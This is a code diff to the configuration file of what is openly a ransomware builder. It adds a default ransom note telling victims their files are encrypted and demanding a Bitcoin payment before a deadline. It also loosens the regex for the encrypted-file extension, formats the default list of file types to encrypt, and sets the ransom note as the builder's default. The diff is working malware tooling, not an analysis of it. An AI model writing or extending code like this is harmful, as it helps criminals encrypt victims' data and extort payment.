@@ -29,6 +29,15 @@ english_language_form_labels = {
     "language_settings_sizer": "Language"
     }
 
+## DEFAULT RANSOM MESSAGE
+RANSOM_MESSAGE = """The important files on your computer have been encrypted with military grade AES-256 bit encryption.
+
+Your documents, videos, images and other forms of data are now inaccessible, and cannot be unlocked without the decryption key. This key is currently being stored on a remote server.
+
+To acquire this key, transfer the Bitcoin Fee to the specified wallet address before the time runs out.
+
+If you fail to take action within this time window, the decryption key will be destroyed and access to your files will be permanently lost."""
+
 ## DEFAULT FILETYPES TO ENCRYPT
 # The default list of filetypes which can be encrypted
 ENCRYPTABLE_FILETYPES = [
@@ -126,7 +135,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "label": "Encrypted File Extension",
             "label_object_name": "EncryptedFileExtensionLabel",
             "input_object_name": "EncryptedFileExtensionTextCtrl",
-            "regex": re.compile("^[A-Za-z0-9]*$"),
+            "regex": re.compile("^[A-Za-z0-9.]*$"),
             "example": "locked",
             "input_requirement": "A series of alphanumeric character(s)",
             "config_area": "Ransomware Settings",
@@ -191,7 +200,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "example": "pdf,exe,msi,doc",
             "input_requirement": "A comma-separated list of filetypes to encrypt",
             "config_area": "Ransomware Settings",
-            "default": ENCRYPTABLE_FILETYPES
+            "default": ",".join(ENCRYPTABLE_FILETYPES)
         }
     ),
     (
@@ -202,7 +211,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "example": "",
             "input_requirement": "Ransom message/note",
             "config_area": "Ransomware Settings",
-            "default": ""
+            "default": RANSOM_MESSAGE
         }
     )
     ])
